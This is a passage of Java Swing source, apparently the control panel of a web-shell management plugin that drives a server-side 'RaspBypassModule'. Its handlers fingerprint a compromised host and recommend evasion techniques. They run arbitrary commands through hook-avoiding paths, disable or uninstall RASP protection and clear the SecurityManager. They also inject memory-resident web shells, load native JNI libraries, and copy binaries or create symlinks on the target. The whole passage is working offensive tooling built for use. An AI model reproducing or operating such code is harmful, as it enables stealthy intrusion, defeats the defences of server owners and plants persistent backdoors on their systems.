        this.raspResultTextArea.append("\u5206\u6790\u73af\u5883\u53d8\u91cf\u3001\u8fdb\u7a0b\u6307\u7eb9\u53ca\u5df2\u6ce8\u5165\u4ee3\u7406...\n");
        this.raspResultTextArea.append("----------------------------------------\n");
        
        try {
            byte[] result = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
            String envData = utf8(result);
            this.raspResultTextArea.append("[+] \u68c0\u6d4b\u5230\u76ee\u6807\u6307\u7eb9\u4fe1\u606f:\n" + envData + "\n");
            
            this.raspResultTextArea.append("[*] \u4e13\u5bb6\u5efa\u8bae:\n");
            if (envData.contains("Rasp") || envData.contains("javaagent")) {
                this.raspResultTextArea.append("  - \u53d1\u73b0\u5f3a\u5b89\u5168\u4ee3\u7406\u6ce8\u5165 (RASP/APM)\u3002\n");
                this.raspResultTextArea.append("  - \u5efa\u8bae: \u4f18\u5148\u4f7f\u7528 '2 JNI \u539f\u751f\u6267\u884c' \u6216 '1 Unsafe.allocateInstance + forkAndExec' \u4ee5\u89c4\u907f ProcessBuilder \u94a9\u5b50\u3002\n");
            } else if (envData.contains("Linux")) {
                this.raspResultTextArea.append("  - \u8fd0\u884c\u5728 Linux \u73af\u5883\u3002\n");
                this.raspResultTextArea.append("  - \u5efa\u8bae: \u53ef\u5c1d\u8bd5 '4 GC finalize \u7ed5\u8fc7' \u9690\u853d\u6267\u884c\uff0c\u6216\u76f4\u63a5\u52a0\u8f7d\u539f\u751f JNI \u5e93\u6267\u884c\u3002\n");
            } else {
                this.raspResultTextArea.append("  - \u672a\u53d1\u73b0\u660e\u663e\u5b89\u5168\u9650\u5236\u6216 RASP \u7279\u5f81\u3002\n");
                this.raspResultTextArea.append("  - \u5efa\u8bae: \u4f7f\u7528 '0 \u81ea\u52a8\u63a2\u6d4b' \u6216\u5e38\u89c4\u6267\u884c\u5373\u53ef\uff0c\u82e5\u88ab\u62e6\u622a\u518d\u6539\u7528\u65b0\u7ebf\u7a0b\u7ed5\u8fc7\u3002\n");
            }
        } catch (Exception e) {
            this.raspResultTextArea.append("\u8bca\u65ad\u5931\u8d25: " + e.getMessage() + "\n");
        }
    }

    private void execButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.resultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String cmd = this.cmdTextField.getText().trim();
        if (cmd.isEmpty()) {
            this.resultTextArea.append("\u8bf7\u8f93\u5165\u547d\u4ee4\uff01\n");
            return;
        }

        String method = (String) this.bypassMethodCombo.getSelectedItem();
        int selectedIndex = this.bypassMethodCombo.getSelectedIndex();
        boolean forceSingle = this.forceSingleCheckBox != null && this.forceSingleCheckBox.isSelected();
        final boolean auto = !forceSingle && (this.autoDetectCheckBox.isSelected() || selectedIndex == 0);
        final int methodIndex = (forceSingle && selectedIndex == 0) ? 1 : selectedIndex;

        this.resultTextArea.append("========================================\n");
        this.resultTextArea.append("mode: " + (auto ? "PIPELINE(Detect>Plan>Exec>Verify)" : "SINGLE") + "\n");
        this.resultTextArea.append("\u65b9\u5f0f: " + method + "\n");
        this.resultTextArea.append("\u547d\u4ee4: " + cmd + "\n");
        this.resultTextArea.append("----------------------------------------\n");

        java.util.concurrent.CompletableFuture.runAsync(() -> {
            try {
                ReqParameter params = new ReqParameter();
                params.add("cmd", cmd);
                params.add("cmdLine", cmd);
                params.add("methodIndex", String.valueOf(methodIndex));
                params.add("autoDetect", auto ? "true" : "false");
                // Optional: ship embedded native so pipeline can promote JniNative
                attachNativeLibBytes(params);

                byte[] result = this.payload.evalFunc("RaspBypassModule", "execCommand", params);
                String strResult = result == null ? "(null)" : utf8(result);
                javax.swing.SwingUtilities.invokeLater(() -> {
                    this.resultTextArea.append(strResult);
                    if (!strResult.endsWith("\n")) {
                        this.resultTextArea.append("\n");
                    }
                    // highlight meta footer if present
                    applyPipelineMetaToStatus(strResult);
                    int meta = strResult.lastIndexOf("<!--RASP_META:");
                    if (meta >= 0) {
                        this.resultTextArea.append("[client] pipeline meta applied to status bar\n");
                    }
                });
            } catch (Exception e) {
                javax.swing.SwingUtilities.invokeLater(() -> {
                    this.resultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
                });
                Log.error(e);
            }
        });
    }

    private void checkRaspButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u6b63\u5728\u68c0\u67e5 RASP \u72b6\u6001\u2026\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            String raspType = (String) this.raspTypeCombo.getSelectedItem();
            params.add("raspType", raspType);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "checkRasp", params);
            String strResult = utf8(result);
            if ("Incorrect return type".equals(strResult.trim())) {
                // Compatibility fallback for old payload marshaling logic.
                this.raspResultTextArea.append("[!] checkRsp method unavailable, payload may need regeneration...\n");
                byte[] envResult = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
                this.raspResultTextArea.append(utf8(envResult) + "\n");
                this.raspResultTextArea.append("[!] Falling back to env check after checkRsp failed\n");
                return;
            }
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void disableRaspButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String raspType = (String) this.raspTypeCombo.getSelectedItem();
        String action = "disableHook";
        if (this.modifyConfigRadio.isSelected()) {
            action = "modifyConfig";
        } else if (this.uninstallRadio.isSelected()) {
            action = "uninstall";
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u6b63\u5728\u5c1d\u8bd5\u7981\u7528 RASP\u2026\n");
        this.raspResultTextArea.append("\u7c7b\u578b: " + raspType + "\n");
        this.raspResultTextArea.append("\u64cd\u4f5c: " + action + "\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("raspType", raspType);
            // compatibility aliases for older module field names
            params.add("type", raspType);
            params.add("rasp", raspType);
            params.add("action", action);
            params.add("op", action);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "disableRasp", params);
            String strResult = utf8(result);
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void universalDisableButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u901a\u7528\u7981\u7528 RASP\uff08\u591a\u8def\u5c1d\u8bd5\uff09\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            byte[] result = this.payload.evalFunc("RaspBypassModule", "universalRaspDisable", new ReqParameter());
            String strResult = utf8(result);
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void uninstallRaspButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u5378\u8f7d RASP \u5c1d\u8bd5\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            byte[] result = this.payload.evalFunc("RaspBypassModule", "uninstallRasp", new ReqParameter());
            String strResult = utf8(result);
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void opsEnvironmentButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }
        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u4e3b\u673a/\u73af\u5883\u6307\u7eb9\uff08\u9884\u4fa6\u67e5\uff09\n");
        this.raspResultTextArea.append("----------------------------------------\n");
        try {
            byte[] result = this.payload.evalFunc("RaspBypassModule", "opsEnvironment", new ReqParameter());
            String env = utf8(result);
            this.raspResultTextArea.append(env + "\n");
            String planLine = "";
            for (String line : env.split("\n")) {
                if (line.contains("PLAN") || line.contains("chain=") || line.contains("summary:")) {
                    planLine = line.trim();
                    break;
                }
            }
            updateStatusBar(planLine.isEmpty() ? "\u8bca\u65ad\u5b8c\u6210" : planLine);
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void clearSecurityManagerButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.raspResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        this.raspResultTextArea.append("========================================\n");
        this.raspResultTextArea.append("\u6b63\u5728\u6e05\u9664 SecurityManager\u2026\n");
        this.raspResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("action", "clearSecurityManager");

            byte[] result = this.payload.evalFunc("RaspBypassModule", "universalRaspDisable", params);
            String strResult = utf8(result);
            this.raspResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.raspResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void injectMemShellButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.memShellResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String shellType = (String) this.memShellTypeCombo.getSelectedItem();
        String urlPath = this.memShellPathTextField.getText().trim();

        this.memShellResultTextArea.append("========================================\n");
        this.memShellResultTextArea.append("\u6b63\u5728\u6ce8\u5165\u5185\u5b58\u9a6c\u2026\n");
        this.memShellResultTextArea.append("\u7c7b\u578b: " + shellType + "\n");
        this.memShellResultTextArea.append("\u8def\u5f84: " + urlPath + "\n");
        this.memShellResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("shellType", shellType);
            params.add("type", shellType);
            params.add("urlPath", urlPath);
            params.add("path", urlPath);
            params.add("uri", urlPath);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "injectMemShell", params);
            String strResult = utf8(result);
            this.memShellResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.memShellResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void removeMemShellButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.memShellResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String shellType = (String) this.memShellTypeCombo.getSelectedItem();

        this.memShellResultTextArea.append("========================================\n");
        this.memShellResultTextArea.append("\u6b63\u5728\u79fb\u9664\u5185\u5b58\u9a6c\u2026\n");
        this.memShellResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("shellType", shellType);
            params.add("type", shellType);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "removeMemShell", params);
            String strResult = utf8(result);
            this.memShellResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.memShellResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void loadJniButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.jniResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String soPath = this.jniSoPathTextField.getText().trim();

        this.jniResultTextArea.append("========================================\n");
        this.jniResultTextArea.append("\u6b63\u5728\u52a0\u8f7d JNI \u5e93\u2026\n");
        this.jniResultTextArea.append("\u8def\u5f84: " + soPath + "\n");
        this.jniResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("soPath", soPath);
            params.add("path", soPath);
            params.add("jniPath", soPath);
            params.add("libraryPath", soPath);
            if (soPath == null || soPath.trim().isEmpty()) {
                attachNativeLibBytes(params);
            }

            byte[] result = this.payload.evalFunc("RaspBypassModule", "loadJniLibrary", params);
            String strResult = utf8(result);
            this.jniResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.jniResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void execJniButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.jniResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String cmd = this.jniCmdTextField.getText().trim();

        this.jniResultTextArea.append("========================================\n");
        this.jniResultTextArea.append("\u901a\u8fc7 JNI \u6267\u884c\u2026\n");
        this.jniResultTextArea.append("\u547d\u4ee4: " + cmd + "\n");
        this.jniResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("cmd", cmd);
            params.add("cmdLine", cmd);
            params.add("command", cmd);
            params.add("commandLine", cmd);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "execViaJni", params);
            String strResult = utf8(result);
            this.jniResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.jniResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void copyBashButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.toolsResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String srcPath = this.sourcePathTextField.getText().trim();
        String dstPath = this.destPathTextField.getText().trim();

        this.toolsResultTextArea.append("========================================\n");
        this.toolsResultTextArea.append("\u6b63\u5728\u590d\u5236\u4e8c\u8fdb\u5236\u2026\n");
        this.toolsResultTextArea.append("\u6e90: " + srcPath + "\n");
        this.toolsResultTextArea.append("\u76ee\u6807: " + dstPath + "\n");
        this.toolsResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("srcPath", srcPath);
            params.add("dstPath", dstPath);
            params.add("source", srcPath);
            params.add("target", dstPath);
            params.add("sourcePath", srcPath);
            params.add("destPath", dstPath);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "copyBinary", params);
            String strResult = utf8(result);
            this.toolsResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.toolsResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }

    private void createLinkButtonClick(ActionEvent event) {
        if (!loadModule()) {
            this.toolsResultTextArea.append("\u6a21\u5757\u672a\u52a0\u8f7d\uff01\n");
            return;
        }

        String srcPath = this.sourcePathTextField.getText().trim();
        String dstPath = this.destPathTextField.getText().trim();

        this.toolsResultTextArea.append("========================================\n");
        this.toolsResultTextArea.append("\u6b63\u5728\u521b\u5efa\u7b26\u53f7\u94fe\u63a5\u2026\n");
        this.toolsResultTextArea.append("\u6e90: " + srcPath + "\n");
        this.toolsResultTextArea.append("\u76ee\u6807: " + dstPath + "\n");
        this.toolsResultTextArea.append("----------------------------------------\n");

        try {
            ReqParameter params = new ReqParameter();
            params.add("srcPath", srcPath);
            params.add("dstPath", dstPath);
            params.add("source", srcPath);
            params.add("target", dstPath);
            params.add("sourcePath", srcPath);
            params.add("destPath", dstPath);

            byte[] result = this.payload.evalFunc("RaspBypassModule", "createSymlink", params);
            String strResult = utf8(result);
            this.toolsResultTextArea.append(strResult + "\n");
        } catch (Exception e) {
            this.toolsResultTextArea.append("\u9519\u8bef: " + e.getMessage() + "\n");
            Log.error(e);
        }
    }
}
